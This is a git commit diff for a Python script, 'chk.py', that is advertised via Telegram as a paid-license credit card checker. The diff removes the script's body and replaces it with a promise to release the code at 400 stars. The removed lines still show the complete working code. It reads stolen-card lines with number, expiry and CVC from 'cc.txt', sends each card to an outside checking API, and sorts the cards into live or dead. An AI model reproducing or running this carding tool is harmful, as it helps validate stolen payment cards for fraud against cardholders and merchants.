45c5fb28f5d93e990df8ae3cf87abca2515437d9
Blagdoi <73658321+Blagdoii@users.noreply.github.com>
2023-03-20 14:01:45 +0100

    Update chk.py

--- chk.py
+++ chk.py
@@ -23,59 +23,6 @@ print(Fore.LIGHTGREEN_EX + 'Created by t.me/liftium -> PAID LICENSE <$')
 print(Fore.GREEN + 'Be sure your card file is called "cc.txt" ')          
 time.sleep(3)                                                                
  
-ccFile = "cc.txt"
-outputFile = "cc_checked_{}.txt".format(int(datetime.timestamp(datetime.now())))
-checkerAPIURL = "https://api.sdbots.tk/chk?cc={}|{}|{}|{}"
-headers = { 
-    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
-    "Accept": "*/*",
-}
+
  
-def writeFileOutput(data, file, mode="a"):
-    f = open(file, mode)
-    f.write("{}\n".format(data))
-    f.close()
-    if "|Live|" in data:
-        print(colored(data, "green", attrs=["bold"]))
-    elif "|Dead|" in data:
-        print(colored(data, "red", attrs=["bold"]))
-    else:
-        print(colored(data, "grey", attrs=["bold"]))
- 
-def main():
-    if os.path.exists(ccFile):
-        with open(ccFile) as f:
-            writeFileOutput("[|VCC|] Output file results: {}".format(outputFile), outputFile)
-            for cc in f:
-                cc = cc.replace("\r", "").replace("\n", "")
-                try:
-                    ccNumber = cc.split("|")[0]
-                    expMonth = cc.split("|")[1]
-                    expYear = cc.split("|")[2]
-                    cvc = cc.split("|")[3]
-                except:
-                    writeFileOutput("{} => Format error. Use ccNumber|expMonth|expYear|cvc".format(cc), outputFile)
-                    continue
-                url = checkerAPIURL.format(ccNumber, expMonth, expYear, cvc)
-                while True:
-                    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
-                    if response.status_code == 200 and "json" in response.headers["Content-Type"]:
-                        data = response.json()
-                        if "result" in data:
-                            output = data["result"]
-                            if "input" in data:
-                                output += " | " + data["input"]
-                            if "bin_info" in data:
-                                output += " | " + data["bin_info"]
-                            if "gete" in data:
-                                output += " | " + data["gete"] + " | Liftium's Chk "
-                        else:
-                            output = data["Your Card Is Invalid."]
-                        writeFileOutput(output, outputFile)
-                    else:
-                        writeFileOutput("Card is Declined.. Trying the next card..", outputFile)
-    else:
-        print("File {} not found in current directory".format(ccFile))
- 
-if __name__ == "__main__":
-    main()
+ ⭐ 400 stars = release
